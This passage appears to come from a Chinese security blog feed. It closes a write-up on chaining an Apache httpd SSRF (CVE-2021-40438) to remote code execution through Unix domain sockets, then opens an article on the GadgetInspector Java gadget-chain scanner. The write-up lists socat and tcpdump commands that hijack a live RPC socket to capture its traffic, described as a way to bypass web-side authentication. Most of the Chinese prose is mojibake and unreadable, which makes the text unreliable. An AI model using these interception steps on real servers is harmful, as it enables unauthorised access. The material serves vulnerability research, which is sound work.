src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/34.png"></p><p>é‚£åªè¦èƒ½æ‹¿åˆ°æœ€ç»ˆè¯·æ±‚åˆ°udsçš„æ•°æ®åŒ…ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡WEBä¾§é‰´æƒè½¬è€Œåˆ©ç”¨httpdä¾§ä»£ç†æ¼æ´è¯·æ±‚udså®Œæˆæ¼æ´ä¸²è”åˆ©ç”¨ã€‚å°è¯•äº†å¾ˆå¤šæ–¹æ³•ï¼Œæœ€ç»ˆé€šè¿‡åˆ›å»ºä¸­è½¬æµé‡çš„8089ç«¯å£æˆåŠŸæŠ“åˆ°äº†udsçš„æ•°æ®åŒ…ã€‚åœ¨è¿‡ç¨‹ä¸­ä½¿ç”¨tcpdumpæŠ“å–xmlrpc.sockçš„æµé‡å‘ç°ä¸ºç©ºï¼Œåœ¨æŸ¥çœ‹äº†cfgé…ç½®æ–‡ä»¶ç»“åˆä¸Šé¢çš„è¿›ç¨‹ä¿¡æ¯å‘ç°è¿˜æœ‰xmlrpc0.sockä¸xmlrpc1.sockï¼Œéšå³å¯¹è¿™ä¸¤ä¸ªsockä¹Ÿè¿›è¡Œäº†ç›‘å¬ï¼Œæœ€åæˆåŠŸåœ¨xmlrpc1.sockä¸­å‘ç°äº†è¯·æ±‚udsçš„æµé‡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-number">1</span>ã€åœ¨æœ¬åœ°<span class="hljs-number">8089</span>ç«¯å£ä¸­è½¬æµé‡<br>mv <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock.original<br>socat TCP-LISTEN:<span class="hljs-number">8089</span>,reuseaddr,fork UNIX-CONNECT:<span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock.original<br>socat UNIX-LISTEN:<span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock,fork TCP-CONNECT:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8089</span><br><br><span class="hljs-regexp">//</span><span class="hljs-number">2</span>ã€è·å–æœ€ç»ˆåˆ°udsçš„æµé‡å¹¶è¾“å‡ºåˆ°lo-test.pcapæ–‡ä»¶ï¼Œå†ä½¿ç”¨wiresharkåˆ†æ<br>tcpdump -i lo -netvv port <span class="hljs-number">8089</span> -w lo-test.pcap<br><br><span class="hljs-regexp">//</span><span class="hljs-number">3</span>ã€æµ‹è¯•å®Œæ¯•åè¿˜åŸå¤‡ä»½<br>mv <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock.original <span class="hljs-regexp">/var/</span>run<span class="hljs-regexp">/rpc/</span>xmlrpc1.sock<br><br>æ³¨ï¼šreuseaddr ç»‘å®šæœ¬åœ°ä¸€ä¸ªç«¯å£ã€fork å¤šé“¾æ¥æ¨¡å¼ï¼Œæ¯å½“æœ‰ä¸€ä¸ªæ–°è¿æ¥è¯·æ±‚åˆ°è¾¾æ—¶ï¼Œforkå‡ºä¸€ä¸ªå­è¿›ç¨‹æ¥å¤„ç†è¯¥è¿æ¥ï¼Œä»¥ä¿æŒå¹¶å‘æ€§<br></code></pre></td></tr></table></figure><p>åœ¨ç›‘å¬udsåè¿”å›åˆ°webç•Œé¢ï¼Œæ‰‹åŠ¨ç‚¹å‡»æ“ä½œXXåŠŸèƒ½åï¼Œlo-test.pcapå°±æœ‰äº†å†…å®¹ï¼Œä½¿ç”¨wiresharkæ‰“å¼€pcapåŒ…ç­›é€‰hostå°±èƒ½æ‰¾åˆ°å…·ä½“çš„æ•°æ®åŒ…</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/35.png"></p><p>è¿”å›æ•°æ®ï¼š</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/36.png"></p><p>é‚£ä¹ˆå°†è¯¥æ•°æ®åŒ…è½¬ä¸ºä½¿ç”¨httpdä»£ç†æ¼æ´çš„æ ¼å¼å‘é€ç»™udså³å¯å®Œæˆæ¼æ´åˆ©ç”¨ï¼Œç¬¬ä¸€æ¬¡åœ¨è¿™é‡Œæµ‹è¯•æ—¶å¤šæ¬¡ç¢°åˆ°è¿”å›502ã€503ã€408ç­‰é”™è¯¯çŠ¶æ€ç çš„æƒ…å†µã€‚ä¸ºäº†å®šä½åœ¨httpd cä»£ç ä¸­çš„å…·ä½“æŠ¥é”™ä¿¡æ¯ï¼Œæˆ‘è¿™é‡Œæ‰‹åŠ¨ä¿®æ”¹é…ç½®æ–‡ä»¶httpd-ssl.confä¸httpd.confï¼Œå¼€å¯æ—¥å¿—è®°å½•å¹¶é‡å¯httpdï¼Œé…ç½®ä¿¡æ¯å¦‚ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">LogLevel notice proxy:trace8<br>CustomLog <span class="hljs-string">&quot;/usr/local/apache/logs/httpd-ssl-accesslog.log&quot;</span> common<br>ErrorLog <span class="hljs-string">&quot;/usr/local/apache/logs/httpd-ssl-error.log&quot;</span><br>LogLevel warn<br><br>è¦†ç›–æ–‡ä»¶httpd.confã€httpd-ssl.conf<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache/</span>bin/httpd -k stop<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/apache/</span>bin/httpd -k start<br>ps -ef|grep httpd  <span class="hljs-regexp">//</span>çœ‹åˆ°httpdè¿›ç¨‹è¯æ˜é‡å¯æˆåŠŸ<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆæˆåŠŸæ„é€ å‡ºä»å‰å°ç›´æ¥è¯·æ±‚åç«¯udsçš„æ•°æ®åŒ…ï¼Œå®Œæˆæ¼æ´åˆ©ç”¨</p><p><img src="/img/from-apache-httpd-ssrf-cve-2021-40438-to-rce/37.png"></p><p>Just For Funï¼</p><h2 id="4ã€å‚è€ƒé“¾æ¥"><a href="#4ã€å‚è€ƒé“¾æ¥" class="headerlink" title="4ã€å‚è€ƒé“¾æ¥"></a>4ã€å‚è€ƒé“¾æ¥</h2><p><a href="https://firzen.de/building-a-poc-for-cve-2021-40438">https://firzen.de/building-a-poc-for-cve-2021-40438</a></p><p><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html</a></p><p><a href="https://mivehind.net/2018/04/20/sniffing-unix-domain-sockets/">https://mivehind.net/2018/04/20/sniffing-unix-domain-sockets/</a></p><p><a href="https://plantegg.github.io/2018/01/01/%E9%80%9A%E8%BF%87tcpdump%E5%AF%B9Unix%20Socket%20%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85%E8%A7%A3%E6%9E%90/">https://plantegg.github.io/2018/01/01/%E9%80%9A%E8%BF%87tcpdump%E5%AF%B9Unix%20Socket%20%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85%E8%A7%A3%E6%9E%90/</a></p><p><a href="https://developer.baidu.com/article/detail.html?id=295123">https://developer.baidu.com/article/detail.html?id=295123</a></p>]]></content>
    
    
    <categories>
      
      <category>ä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä»£ç å®¡è®¡</tag>
      
      <tag>CVE-2021-40438</tag>
      
      <tag>SSRF-TO-RCE</tag>
      
      <tag>Unix-Domain-Socket</tag>
      
      <tag>æ¼æ´æŒ–æ˜æ€è·¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é™æ€ä»£ç æ‰«æå·¥å…·ä¹‹GadgetInspectoræ¢ç©¶</title>
    <link href="/2023/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/"/>
    <url>/2023/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/</url>
    
    <content type="html"><![CDATA[<p>ååºåˆ—åŒ–æ¼æ´ä¸€ç›´å æ®ç€JAVAå®‰å…¨çš„åŠå£æ±Ÿå±±ï¼Œæ˜¯æ¯ä¸ªJAVAå®‰å…¨ç ”ç©¶è€…éƒ½ç»•ä¸å¼€çš„å¤§å±±ä¹‹ä¸€ã€‚ä»15å¹´è¢« <a href="https://twitter.com/frohoff">@frohoff</a> and <a href="https://twitter.com/gebl">@gebl</a> å…¬å¸ƒåˆ©ç”¨åˆ°ç°åœ¨è¿‘8å¹´çš„æ—¶é—´ï¼Œååºåˆ—åŒ–æ¼æ´åœ¨Oracle&#x2F;Apache&#x2F;vmware&#x2F;IBM&#x2F;å›½äº§ç­‰ä¼—å¤šå‚å•†çš„ç³»ç»Ÿã€ç»„ä»¶ã€ä¸­é—´ä»¶ä¸­è‚†è™æ¨ªè¡Œã€‚ç¬”è€…åœ¨ä¹‹å‰æ–‡ç« åˆ†æçš„JNDI&#x2F;RMI&#x2F;JMXç­‰å‡ä¸æ­¤å®‰å…¨é—®é¢˜æœ‰åƒä¸ä¸‡ç¼•çš„å…³ç³»ã€‚é“¾æ¥ç›´è¾¾ï¼š</p><p><a href="https://pwnull.github.io/2022/How-to-attack-RMI-based-JMX-services/"> Attack JMX Serviceçš„æ‰“å¼€æ–¹å¼ </a></p><p><a href="https://pwnull.github.io/2022/Exploring-JAVA-RMI's-offensive-and-defensive-history/">è®ºJAVA-RMIçš„æ”»é˜²æ¼”è¿›å²</a></p><p><a href="https://pwnull.github.io/2022/jndi-injection-history/">å½“æˆ‘ä»¬è°ˆè®ºJNDIæ³¨å…¥æ—¶ï¼Œæˆ‘ä»¬åœ¨è°ˆè®ºä»€ä¹ˆ</a></p><p>ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨çš„å…¥å£æ–¹æ³•sourceåŠæœ€ç»ˆæ¼æ´è§¦å‘æ–¹æ³•sinkéƒ½å®¹æ˜“ç¡®å®šï¼Œè€Œå¯»æ‰¾è¿æ¥å…¥å£æ–¹æ³•åˆ°æ¼æ´è§¦å‘æ–¹æ³•ä¸­é—´çš„åˆ©ç”¨é“¾è·¯æ‰æ˜¯æŒ–æ˜ä¸åˆ©ç”¨çš„é‡ç‚¹ã€‚åœ¨æ—¥å¸¸çš„å®¡è®¡æŒ–æ˜è¿‡ç¨‹ä¸­ï¼Œæ—¥ç›Šæ„Ÿè§‰ysoserialã€marshalsecä¸­ç°å­˜çš„åˆ©ç”¨é“¾å¹¶ä¸èƒ½ç™¾å‘ç™¾ä¸­ï¼Œå¾ˆå¤šæ—¶å€™éƒ½éœ€è¦æˆ‘ä»¬æ ¹æ®ç°æœ‰ç¯å¢ƒå¯»æ‰¾æ–°çš„åˆ©ç”¨é“¾ã€‚åœ¨å¯»æ‰¾è¿‡ç¨‹ä¸­ä¹Ÿéå¸¸è€ƒéªŒæŒ–æ˜è€…çš„çŸ¥è¯†å‚¨å¤‡ä¸è€å¿ƒã€‚é‚£æœ‰æ²¡æœ‰ä¸€æ¬¾è‡ªåŠ¨åŒ–&#x2F;åŠè‡ªåŠ¨åŒ–çš„å·¥å…·å¯ä»¥è¾…åŠ©æˆ‘ä»¬å»å¯»æ‰¾å‘¢ï¼Ÿä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒIan Hakenåœ¨18å¹´çš„blackhatå¤§ä¼šæ¨å‡ºäº†ä¸€æ¬¾è‡ªç ”æ‰«æå·¥å…· GadgetInspectorï¼Œå…³äºè¯¥æ¬¾å·¥å…·çš„åŸæ–‡ä»‹ç»ã€æºç åŠè§†é¢‘å¦‚ä¸‹ï¼š</p><p>æºç ï¼š<a href="https://github.com/JackOfMostTrades/gadgetinspector">https://github.com/JackOfMostTrades/gadgetinspector</a></p><p>æ–‡ç¨¿ï¼š<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></p><p>è§†é¢‘ï¼š<a href="https://www.youtube.com/watch?v=fdctNIt8OIw">https://www.youtube.com/watch?v=fdctNIt8OIw</a></p><p>åœˆå†…çš„å¸ˆå‚…ä¹Ÿå¯¹æ­¤å·¥å…·åšè¿‡åˆ†æä¸å®Œå–„ï¼Œæœ¬æ–‡ä¹Ÿå‚è€ƒäº†ä¸€äº›å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œè‡´æ•¬æ„Ÿè°¢åˆ†äº«ï¼</p><p><a href="https://threedr3am.github.io/2020/01/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7gadgetinspector%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">threedr3am-javaååºåˆ—åŒ–åˆ©ç”¨é“¾è‡ªåŠ¨æŒ–æ˜å·¥å…·gadgetinspectoræºç æµ…æ</a></p><p><a href="https://paper.seebug.org/1034/">Longofo-Java ååºåˆ—åŒ–å·¥å…· gadgetinspector åˆçª¥</a></p><p><a href="https://su18.org/post/gadgetor/">su18-é«˜æ•ˆæŒ–æ˜ååºåˆ—åŒ–æ¼æ´â€”â€”GadgetInspectoræ”¹é€ </a></p><p>æ•´ä½“æ¥çœ‹ GadgetInspectorå·¥å…·è¿è¡Œæµç¨‹ä¸»è¦ä¸ºå¯¹classpathä¸­å…¨éƒ¨classè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œç”Ÿæˆæ–¹æ³•å†…ã€æ–¹æ³•é—´çš„æ±¡ç‚¹ä¼ é€’å…³ç³»ï¼Œæœ€ç»ˆæ‰¾åˆ°ä»sourceå¯ä»¥é€šå¾€sinkçš„åˆ©ç”¨é“¾ã€‚å¦å¤–æ‰«æé’ˆå¯¹çš„æ˜¯javaå­—èŠ‚ç ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åˆ†æJaråŒ…&#x2F;WaråŒ…è€Œæ— éœ€é¡¹ç›®javaæºç ã€‚æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œå…¶ä¸­æ¶‰åŠåˆ°JAVA ASMæŠ€æœ¯ã€JVMæŒ‡ä»¤ã€é€†æ‹“æ‰‘æ’åºã€è¿›å‡ºæ ˆæ¨¡æ‹Ÿç­‰ç­‰çŸ¥è¯†ã€‚ä¹‹å‰å¯¹è¿™å—å†…å®¹äº†è§£ä¸å¤šï¼Œä¹Ÿæƒ³åšä¸ªæ‰«æå·¥å…·è¾…åŠ©è‡ªå·±åšä¸€äº›åŸºç¡€å®¡è®¡çš„å·¥ä½œï¼Œäº‰å–æ—©æ—¥è§£æ”¾åŒæ‰‹ï¼æœ¬æ–‡ä»æ‰€éœ€çš„å‰ç½®çŸ¥è¯†ã€åˆ†ææ‰«ææµç¨‹ä¸­çš„å…³é”®ç±»åŠå®é™…æµ‹è¯•æ‰«æä¸‰éƒ¨åˆ†å±•å¼€ï¼Œå¦‚æœå¯¹æ–‡ç« æœ‰ç–‘é—®&#x2F;å»ºè®®æˆ–è€…æƒ³ä¸€èµ·ç ”ç©¶äº¤æµçš„å¸ˆå‚…ï¼Œæ¬¢è¿ç§ä¿¡ğŸ˜œ</p><h2 id="1ã€å‰ç½®çŸ¥è¯†"><a href="#1ã€å‰ç½®çŸ¥è¯†" class="headerlink" title="1ã€å‰ç½®çŸ¥è¯†"></a>1ã€å‰ç½®çŸ¥è¯†</h2><p>å‰ç½®çŸ¥è¯†éƒ¨åˆ†ä¸»è¦æœ‰æè¿°ç¬¦ã€ASMæŠ€æœ¯åŠJVMç›¸å…³çš„çŸ¥è¯†ã€‚ä¸‡ä¸ˆé«˜æ¥¼å¹³åœ°èµ·ï¼Œæ™“å¾—äº†åŸºç¡€çŸ¥è¯†æ–¹ä¾¿åç»­å±•å¼€åˆ†æ</p><h3 id="1-1-æè¿°ç¬¦"><a href="#1-1-æè¿°ç¬¦" class="headerlink" title="1.1 æè¿°ç¬¦"></a>1.1 æè¿°ç¬¦</h3><p>GadgetInspectoræœ€å¼€å§‹å¯¹ç±»ã€æ–¹æ³•ä¿¡æ¯æœé›†é˜¶æ®µä¼šç”¨åˆ°ç±»å‹åŠæ–¹æ³•æè¿°ç¬¦</p><p>1ã€ç±»å‹æè¿°ç¬¦ï¼ŒJAVAåŸå§‹ç±»å‹çš„æè¿°ç¬¦å‡å¯¹åº”ä¸€ä¸ªå¤§å†™å­—æ¯ã€‚éæ•°ç»„çš„å¼•ç”¨ç±»å‹ä½¿ç”¨ï¼š<code>L+ç±»å…¨é™å®šåç§°+;</code> ã€æ•°ç»„å¼•ç”¨ç±»å‹ä½¿ç”¨ï¼š<code>[+æ•°ç»„å†…ç±»å‹æè¿°ç¬¦+;</code></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">byte</span> -&gt;</span> B<br><span class="hljs-function"><span class="hljs-title">short</span> -&gt;</span> S<br><span class="hljs-function"><span class="hljs-title">int</span> -&gt;</span> I<br><span class="hljs-function"><span class="hljs-title">long</span> -&gt;</span> J<br><span class="hljs-function"><span class="hljs-title">float</span> -&gt;</span> F<br><span class="hljs-function"><span class="hljs-title">double</span> -&gt;</span> D<br><span class="hljs-function"><span class="hljs-title">char</span> -&gt;</span> C<br><span class="hljs-function"><span class="hljs-title">void</span> -&gt;</span> V<br><span class="hljs-function"><span class="hljs-title">boolean</span> -&gt;</span> Z<br><br><span class="hljs-function"><span class="hljs-title">java</span>.lang.Runtime -&gt;</span> Ljava/lang/Runtime;<br><span class="hljs-function"><span class="hljs-title">java</span>.lang.Object[] -&gt;</span> [java/lang/Object;<br><span class="hljs-function"><span class="hljs-title">int</span>[][] -&gt;</span> [[I<br></code></pre></td></tr></table></figure><p>2ã€æ–¹æ³•æè¿°ç¬¦</p><p>å­—èŠ‚ç ä¸­ä¿å­˜å‚æ•°ç±»å‹åˆ—è¡¨åŠè¿”å›å€¼ç±»å‹æ—¶ä¼šç”¨åˆ°æ–¹æ³•æè¿°ç¬¦ï¼Œè§„åˆ™ï¼š1ã€æ ¼å¼ä¸º<code>(+å‚æ•°åˆ—è¡¨+)+è¿”å›å€¼;</code>2ã€å‚æ•°åˆ—è¡¨æ— éœ€ç”¨é€—å·åˆ†å‰²</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-built_in">String</span> add<span class="hljs-function"><span class="hljs-params">(int a,int b)</span> -&gt;</span> (II)Ljava/lang/<span class="hljs-built_in">String</span>;<br><span class="hljs-literal">void</span> sub<span class="hljs-function"><span class="hljs-params">(int a,int b)</span> -&gt;</span> (II)V<br>int[] s<span class="hljs-function"><span class="hljs-params">(<span class="hljs-built_in">Object</span> obj)</span> -&gt;</span> (Ljava/lang/<span class="hljs-built_in">Object</span>;)[I<br><span class="hljs-literal">void</span> a<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> ()V<br></code></pre></td></tr></table></figure><p>3ã€æ–¹æ³• accesså€¼</p><p>accesså€¼æ˜¯æŒ‰ç…§æ–¹æ³•çš„ä¿®é¥°ç¬¦å¯¹åº”å€¼åšâ€æŒ‰ä½æˆ–|â€è®¡ç®—å¾—æ¥çš„ï¼Œå¦‚mainå‡½æ•°ä¸ºpublicã€staticä¿®é¥°ï¼Œåˆ™<code>access = ACC_PUBLIC(1) | ACC_STATIC(8) = 9</code>ï¼Œå…·ä½“å¯¹åº”å€¼çš„å®šä¹‰åœ¨org.objectweb.asm.Opcodesç±»ä¸­</p><table><thead><tr><th>access</th><th>name</th><th>desc</th></tr></thead><tbody><tr><td>1</td><td><init></td><td>()V</td></tr><tr><td>9</td><td>main</td><td>([Ljava&#x2F;lang&#x2F;String;)V</td></tr></tbody></table><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/1.png"></p><p><client>æ–¹æ³•ï¼šjavaç±»åŠ è½½åˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œä¼šå°†ç±»ä¸­çš„ç±»å˜é‡èµ‹å€¼ã€é™æ€ä»£ç å—ä¸­çš„è¯­å¥é›†åˆä¸º<client>æ–¹æ³•</p><h3 id="1-2-ASMæŠ€æœ¯"><a href="#1-2-ASMæŠ€æœ¯" class="headerlink" title="1.2 ASMæŠ€æœ¯"></a>1.2 ASMæŠ€æœ¯</h3><p>GadgetInspectorä¸­ä¸»è¦åˆ©ç”¨äº†ASMçš„è®¿é—®è€…æ¨¡å¼å¯¹ç±»&#x2F;æ–¹æ³•è¿›è¡Œè§‚å¯Ÿæ“ä½œï¼ŒASMå°è£…äº†å¯¹äºclassæ–‡ä»¶ç»“æ„å„é¡¹å…ƒç´ çš„æ“ä½œï¼Œå¯¹ç±»ä½¿ç”¨ClassVisitorå®ç°ç±»è¿›è¡Œè§‚å¯Ÿã€å¯¹æ–¹æ³•ä½¿ç”¨MethodVisitorå®ç°ç±»è¿›è¡Œè§‚å¯Ÿ</p><p>ClassVisitor ç”¨äºè§‚å¯Ÿç±»ä¿¡æ¯ï¼ŒGadgetInspectorä¸­ä½¿ç”¨çš„å‡ ä¸ªç±»è§‚å¯Ÿç±»ï¼šMethodDiscoveryClassVisitorã€MethodCallDiscoveryClassVisitorã€PassthroughDataflowClassVisitorã€ModelGeneratorClassVisitorã€‚è¿™äº›ç±»éƒ½ç»§æ‰¿å®ç°äº†çˆ¶ç±»ClassVisitorçš„visitXXXæ–¹æ³•ï¼Œå¦‚ä¸‹æ˜¯æ–¹æ³•åç§°åŠè§¦å‘è°ƒç”¨çš„æ¡ä»¶</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visit</span> åˆå§‹åŒ–è¢«è§‚å¯Ÿç±»çš„æè¿°ä¿¡æ¯<br>visitField è§‚å¯Ÿåˆ°å±æ€§æ—¶è§¦å‘æ­¤æ–¹æ³•<br>visitMethod è§‚å¯Ÿåˆ°æ–¹æ³•æ—¶è§¦å‘æ­¤æ–¹æ³•<br></code></pre></td></tr></table></figure><p>MethodVisitor ç”¨äºè§‚å¯Ÿæ–¹æ³•ä¿¡æ¯ï¼ŒGadgetInspectorä¸­ä½¿ç”¨çš„å‡ ä¸ªæ–¹æ³•è§‚å¯Ÿç±»ï¼šMethodCallDiscoveryMethodVisitorã€PassthroughDataflowMethodVisitorã€ModelGeneratorMethodVisitorã€TaintTrackingMethodVisitorã€‚åœ¨è¿™äº›ç±»ä¸­æ¶‰åŠåˆ°å‡ ä¸ªæ¯”è¾ƒé‡è¦ä¸”é¢‘ç¹è°ƒç”¨çš„visitXXXæ–¹æ³•ï¼Œå¦‚ä¸‹æ˜¯æ–¹æ³•åç§°åŠè§¦å‘è°ƒç”¨çš„æ¡ä»¶</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visitCode</span> è¿›å…¥æ–¹æ³•æ—¶è§¦å‘<br>visitMethodInsn æ–¹æ³•å†…è°ƒç”¨å­æ–¹æ³•æ—¶è§¦å‘<br>visitInsn ç¢°åˆ°æ— æ“ä½œæ•°æŒ‡ä»¤æ—¶è§¦å‘<br>visitFieldInsn è°ƒç”¨å­—æ®µæ—¶è§¦å‘<br>visitVarInsn æ“ä½œå˜é‡æ—¶è§¦å‘<br></code></pre></td></tr></table></figure><p>å¦å¤–å¯ä»¥ä½¿ç”¨IDEAçš„ASM Bytecode Vieweræ’ä»¶æŸ¥çœ‹ç±»å¯¹åº”çš„å­—èŠ‚ç åŠASMä»£ç </p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/2.png"></p><p>ASMä»£ç </p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/3.png"></p><h3 id="1-3-JVM"><a href="#1-3-JVM" class="headerlink" title="1.3 JVM"></a>1.3 JVM</h3><p>åœ¨é‡ç‚¹åˆ†æä¸‹èŠ‚å†…å®¹å‰ï¼Œæˆ‘ä»¬å…ˆå¼•å…¥ä¸€äº›JVMä¸­çš„åŸºç¡€æ¦‚å¿µï¼šå˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€JVMæŒ‡ä»¤é›†</p><p>æœ¬åœ°å˜é‡è¡¨ <strong>Local Variable Table</strong> ï¼šå­˜å‚¨çš„æ˜¯ æ–¹æ³•å‚æ•°å’Œæ–¹æ³•å†…å®šä¹‰çš„å±€éƒ¨å˜é‡ã€‚å®¹é‡ä»¥ å˜é‡æ§½ Variable Slot ä¸ºæœ€å°å•ä½ï¼Œä¸€ä¸ªæ§½å¯ä»¥æ”¾ç½®32ä½ä»¥å†…çš„æ•°æ®ç±»å‹</p><p>æ“ä½œæ•°æ ˆ <strong>Operand Stack</strong> ï¼šæ˜¯ä¸€ä¸ªåå…¥å…ˆå‡ºæ ˆLIFOï¼ˆlast in first outï¼‰ã€‚å½“ä¸€ä¸ªæ–¹æ³•å¼€å§‹æ‰§è¡Œå‰æ“ä½œæ•°æ ˆæ˜¯ç©ºçš„ï¼Œéšç€æ–¹æ³•æ‰§è¡Œï¼Œä¼šä»æœ¬åœ°å˜é‡è¡¨ã€å¯¹è±¡å®ä¾‹å­—æ®µä¸­åŠ è½½å˜é‡&#x2F;å¸¸é‡åˆ°æ“ä½œæ•°æ ˆä¸­ï¼Œä¹Ÿä¼šå°†æ ˆä¸­å…ƒç´ å‡ºæ ˆåˆ°æœ¬åœ°å˜é‡è¡¨æˆ–è¿”å›ç»™æ–¹æ³•è°ƒç”¨è€…ï¼Œå³ä¸ºå‡ºæ ˆå…¥æ ˆæ“ä½œã€‚å½“æ–¹æ³•æ‰§è¡Œå®Œæ¯•ä¸”æœ‰è¿”å›å€¼èµ‹å€¼ç»™å˜é‡æ—¶ï¼Œéœ€è¦é€šè¿‡ [type]store_[n]ç­‰æŒ‡ä»¤å°†å˜é‡(ç±»å‹type)å­˜å…¥æœ¬åœ°å˜é‡è¡¨å¯¹åº”çš„ä½ç½®(ç´¢å¼•n)ã€‚è€Œä¸€æ¬¡æ–¹æ³•çš„æ‰§è¡Œå¾€å¾€åŒ…å«å¤šä¸ªå‡ºæ ˆ&#x2F;å…¥æ ˆçš„è¿‡ç¨‹</p><p>JVMæŒ‡ä»¤é›†<strong>Java Virtual Machine Instruction Set</strong>ï¼šç”±æ“ä½œç ä¸æ“ä½œæ•°ç»„æˆï¼Œä¸€æ¡JVMæŒ‡ä»¤å¯ä»¥åŒ…å«0ä¸ªæˆ–å¤šä¸ªæ“ä½œæ•°ã€‚å¤§å¤šæ•°çš„JVMæŒ‡ä»¤ç›´æ¥åŒ…å«äº†æ“ä½œå¯¹åº”çš„æ•°æ®ç±»å‹ä¿¡æ¯ï¼Œæ¯”å¦‚iloadã€floadå°±è¡¨ç¤ºä»æœ¬åœ°å˜é‡è¡¨ä¸­åŠ è½½intæ•°æ®ã€floatæ•°æ®åˆ°æ“ä½œæ•°æ ˆã€‚åœ¨GadgetInspectorå·¥å…·ä¸­ TaintTrackingMethodVisitor#visitInsnå°±æ¨¡æ‹Ÿäº†æ— æ“ä½œæ•°çš„JVMæŒ‡ä»¤æ“ä½œï¼ŒTaintTrackingMethodVisitor#visitIntInsnæ¨¡æ‹Ÿäº†ä¸€ä¸ªæ“ä½œæ•°çš„JVMæŒ‡ä»¤æ“ä½œï¼ˆç¬¬ä¸€ä¸ªintå‚æ•°è¡¨ç¤ºæ“ä½œç ã€ç¬¬äºŒä¸ªè¡¨ç¤ºæ“ä½œæ•°ï¼‰</p><p><img src="/img/Research-on-GadgetInspector-of-Static-Code-Scanning-Tool/4.png"></p><p>å„æŒ‡ä»¤ä»£è¡¨çš„å«ä¹‰å¯å‚è€ƒoracleå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html">https://docs.oracle.com/javase/specs/jvms/se19/html/jvms-6.html</a></p><p>æ¯ä¸ªç±»å¯¹åº”çš„jvmæŒ‡ä»¤é›†å¯ä»¥ä½¿ç”¨ideaæ’ä»¶jclasslibå¾ˆæ–¹ä¾¿çš„æŸ¥çœ‹ï¼š<a href="https://github.com/ingokegel/jclasslib">https://github.com/ingokegel/jclasslib</a>  